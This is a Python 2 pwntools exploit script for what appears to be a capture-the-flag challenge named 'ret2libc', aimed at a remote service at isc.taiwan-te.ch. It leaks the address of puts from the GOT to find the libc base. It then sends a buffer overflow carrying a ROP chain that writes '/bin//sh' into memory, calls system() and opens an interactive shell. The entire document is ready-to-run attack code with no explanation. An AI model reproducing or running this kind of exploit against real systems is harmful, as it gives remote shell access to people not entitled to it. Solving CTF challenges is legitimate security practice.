#!/usr/bin/env python2
from pwn import *
import pwnlib.elf

# init
c = remote('isc.taiwan-te.ch', 10006)
lib = ELF('libc-2.27.so')
e = ELF('ret2libc')

context.os='linux'
context.arch='amd64'

# get puts GOT address
ans = format(e.got['puts'], 'x') + '\n'
c.send(ans)
c.recvuntil('Content: ')            # drop messege
got_puts = int(c.recvuntil('\n'))   # get address
print('\'' + str(got_puts) + '\'')

# set return address is system()
got_start = got_puts - lib.symbols['puts']
got_system = got_start + lib.symbols['system']

ans = '\0' * (0x30 + 8) # fill buffer

# write /bin/sh
ans += p64(got_start + 0x2155f) # pop rdi ; ret
ans += p64(e.get_section_by_name('.data').header.sh_addr)
ans += p64(got_start + 0x439c8) # pop rax ; ret
ans += '/bin//sh'
ans += p64(got_start + 0x586ea) # mov qword ptr [rdi], rax ; mov rax, rdi ; ret

# call
ans += p64(got_start + 0x156944) # pop rax ; call rax
ans += p64(got_system) # set rax is system

c.sendline(ans)

c.interactive()
c.close()
